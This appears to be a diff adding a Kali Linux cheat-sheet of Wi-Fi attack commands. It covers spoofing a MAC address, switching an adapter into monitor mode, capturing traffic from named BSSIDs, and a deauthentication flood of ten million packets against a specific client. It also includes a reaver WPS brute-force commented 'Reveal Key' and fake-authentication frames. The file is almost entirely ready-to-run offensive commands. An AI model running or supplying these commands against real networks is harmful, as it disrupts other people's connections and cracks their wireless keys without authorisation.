@@ -1,0 +1,36 @@
+root@kali:~# 
+ifconfig 		# to get ip & interfaces
+iwconfig 		# To get Wifi Adapters
+top				# To View runnin process of linux
+clear			# To Clear screen
+
+ifconfig wlan0 down							# To make down wi-fi adapter
+ifconfig wlan0 hw ether 00:11:22:33:44:55	# C	hanging Mac Address in memory as temparary
+ifconfig wlan0 up							# To make wi-fi Up
+ifconfig									# to get ip & interfaces
+iwconfig									# To get Wifi Adapters
+ifconfig wlan0 down
+airmon-ng check kill						# Kill All internet connections to system
+iwconfig wlan0 mode monitor					# Changing Wi-Fi Adapter to monitoring Mode
+ifconfig wlan0 up							# Making Up
+iwconfig									# Get Adapter Info
+airodump-ng --band abg wlan0				# To Get All wi-fi routers (2.4gh & 5G)
+airodump-ng --bssid C6:8E:8F:3A:BC:E4 --channel 11 wlan0					# To view only selected BSSID
+airodump-ng --bssid C6:8E:8F:3A:BC:E4 --channel 11 wlan0 --write tes		# To view only selected BSSID with storing on file test
+iwconfig
+airodump-ng wlan0							# Near by wifi's
+airodump-ng --bssid B0:A7:B9:27:B5:88 --channel 6 wlan0 --write ngr
+wireshark
+aireplay-ng --deauth 10000000 -a B0:A7:B9:27:B5:88 -c D4-6D-6D-DB-11-C2 wlan0
+
+ifconfig
+
+# To view WPS Enabled Routers around ur place
+wash --interface wlan0
+
+reaver --bssid C6:8E:8F:3A:BC:E4 --channel 11 --interface wlan0 -vvv --no-associate	# Reveal Key
+
+aireplay-ng --fakeauth 30 -a C6:8E:8F:3A:BC:E4 -h 28:87:BA:CC:7F:4E wlan0          	# Sending fake auth
+
+root@kali:~# 
+
